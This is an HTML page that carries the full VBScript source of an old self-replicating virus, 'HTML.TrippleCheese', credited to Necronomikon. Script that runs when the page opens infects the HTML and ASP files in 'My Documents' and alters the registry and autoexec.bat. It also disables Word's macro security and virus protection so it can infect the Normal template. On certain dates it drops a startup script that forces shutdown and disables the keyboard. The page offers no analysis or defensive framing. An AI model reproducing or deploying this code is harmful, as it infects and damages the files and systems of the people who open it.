<nospace>

<html>
<head>
<title>Tripple Cheese</title>
</head>

<body>

<br><br><br>
<TD><marquee bgcolor="#585a5a"><FONT COLOR="#FFFFFF"><B>HTML.TrippleCheese by
Necronomikon</B></FONT></marquee></TD>
<center>
<br>
<br>
<font size = 2 face="times">Info:HTML-Dropper based on e-Gen by f0re</font>

<br>[rRlf]
<br>
<font face="arial" size=1>
<b></b><font face="arial" size=2><pre>&copy 2001   Necronomikon[Zer0Gravity]</pre><br><br> 
<bR>
</font>
<font size="1" face="arial">greets to the local VX-Scene.
</center>

<script language="VBScript"><!--

Sub Nec()
End Sub
If Day(Now()) = 13 or Day(Now()) = 14 Then
Message_Text   = "Hmmm,Yamyam...;)"
Title_Text     = "-=Tripple Cheese=-"
    intDoIt =  MsgBox(Message_Text, _
                      vbOKOnly + vbInformation,    _
                      Title_Text)
  End If


On error Resume Next

Set WshShell = CreateObject("WScript.Shell")

WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "necronomikon"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Infected\With\Name", "HTML.TrippleCheese"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Infected\With\Author", "Necronomikon"


	Dim FSO
	Set FSO = CreateObject("Scripting.FileSystemObject")
	
	Set fh = fso.opentextfile("c:\autoexec.bat", 1, true)
	FileContents = fh.ReadAll()
	fh.close
	Set fh = fso.opentextfile("c:\autoexec.bat", 2, true)
	Nextline = "pause"
	fh.write(FileContents)
	fh.writeline NextLine
	fh.close

	Set TRange = document.body.createTextRange

	Set cd = FSO.OpenTextFile("c:\windows\system\necro.txt", 2, True)
	cd.WriteLine TRange.htmltext
	cd.close()

	findr = "novalue"
	Set cd = FSO.OpenTextFile("c:\windows\system\necro.txt", 1, False)

	beginvir = "Sub Nec()"
	
	Do While cd.atendofstream <> True
		findr = cd.readline
		if findr = beginvir then exit Do
	Loop

	Set nd = FSO.OpenTextFile("c:\windows\system\necro2.txt", 2, True)
	
	linr = "trip"
	nd.writeline "<script language=" + Chr(34) + "VBScript" + Chr(34) + "><!--"
	nd.writeline beginvir
	Do While cd.atendofstream <> True
		linr = cd.readline
		nd.writeline linr
	Loop
	
	nd.close
	cd.close


 	
        Set FolderObj = FSO.GetFolder("c:\my documents\")
	Set FO = FolderObj.Files
	For each target in FO
		ExtName = lcase(FSO.GetExtensionName(target.Name))
		if ExtName = "htt" or ExtName = "asp" or ExtName = "htm" or ExtName = "html" then
			Set Real = FSO.OpenTextFile(target.path, 1, False)
			if Real.readline <> "<nospace>" then
				Real.close()
				GetFile(target.path)
			else
				Real.close()
			end if
		end if
	next


Sub GetFile(GetFileName)

	Set nd = FSO.OpenTextFile("c:\windows\system\necro2.txt", 1, True)
	virus = nd.readAll()
	nd.close

	Set Real = FSO.OpenTextFile(GetFileName, 1, False)
	FileContents2 = Real.ReadAll()
	Real.close()

	Set Real = FSO.OpenTextFile(GetFileName, 2, False)
	Real.WriteLine "<nospace>"
	Real.Write(FileContents2)
	Real.writeline " "
	Real.writeline " "
	Real.Write(virus)
	Real.close()
End Sub
	



	wfindr = "novalue"
	Set cd = FSO.OpenTextFile("c:\windows\system\necro2.txt", 1, False)

	wbeginvir = "Sub WordNec()"
	
	Do While cd.atendofstream <> True
		wfindr = cd.readline
		if wfindr = wbeginvir then exit Do
	Loop

	Set nd = FSO.OpenTextFile("c:\windows\system\necro3.txt", 2, True)
	
	wlinr = "trip"
	nd.writeline "Private Sub Document_Open()"

	Do While wlinr <> "End Sub"
		wlinr = cd.readline
		nd.writeline wlinr
	Loop
	
	nd.close
	cd.close


	Set wv = FSO.OpenTextFile("c:\windows\system\necro3.txt", 1, True)
	Set nwv = FSO.OpenTextFile("c:\windows\system\necro4.txt", 2, True)
	readmvir = "nopers"

	Do while wv.atendofstream <> True
		readmvir = wv.readline
		if Mid(readmvir,1,1) = "'" then readmvir = Mid(readmvir,2,Len(readmvir) -1)
		
		nwv.writeline readmvir	
	Loop

	nwv.Close
	wv.close

	Set iw = FSO.OpenTextFile("c:\windows\system\necro4.txt", 1, True)
	wordvir = iw.readAll()
	iw.close

	Set iw = FSO.OpenTextFile("c:\windows\system\necro4.txt", 1, True)
	
	Set WordObj = CreateObject("Word.Application")
	Set NT= WordObj.normaltemplate.vbproject.vbcomponents(1).codemodule

	If NT.Lines(3,1) <> "'TrippleCheese" then
	
		WordObj.Options.SaveNormalPrompt = False
		NT.DeleteLines 1, NT.CountOfLines
		i = 1
		
		Do while iw.atendofstream <> true
		b = iw.readline
		NT.InsertLines i, b
		i = i + 1
		Loop
			    	
	End If
	Set NT = Nothing
	WordObj.Quit
	iw.close



Sub WordNec()
On Error Resume Next
'HTML.TrippleCheese-Wordmacro.Dropper
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Ofice\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Delete
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
tripple= ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Application.EnableCancelKey = 0
Options.ConfirmConversions = 0
cheese= NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If tripple > 0 and cheese > 0 then goto food
If tripple = 0 Then 
set KKS = ActiveDocument.VBProject.VBComponents.Item(1)
DE82 = TRUE
End If
If cheese = 0 Then 
set KKS = NormalTemplate.VBProject.VBComponents.Item(1)
NEC = TRUE
End If
If NEC <> TRUE and DE82 <> TRUE then goto food
If NEC = TRUE then KKS.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, tripple - 1))
If DE82 = TRUE Then KKS.CodeModule.AddFromString ("Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, cheese - 1))
If Month(Now) = 12  and Day(Now) = 14 Then 
Open "c:\windows\startm~1\progra~1\autost~1\TrippleCheese.vbs" For Output As 1
Print #1, "rem HTML.TrippleCheese-VBS.Dropper by Necronomikon"
Print #1, "MsgBox ""(c)by Necronomikon [Zer0Gravity]", vbInformation, "HTML.TrippleCheese"
Print #1, "If Day(Now)=12 or Day(Now)=28 Then"
Print #1, "MsgBox ""You're tired now" + vbCrLf + "Switch off you're Computer", vbExclamation, "TrippleCheese"""
Print #1, "ws.Run "" rundll32.exe; user.exe, ExitWindows"""
Print #1, "End If"
Print #1, "If Day(Now)=14 Then"
Print #1, "MsgBox ""The keyboard is on strike !", vbInformation, "TrippleCheese"
Print #1, "ws.Run ""rundll32 Keyboard, Disable"""
Print #1, "End If"
Print #1, " Next"
Close 1
End If
food:
End Sub


--></script>
</body>
</html>

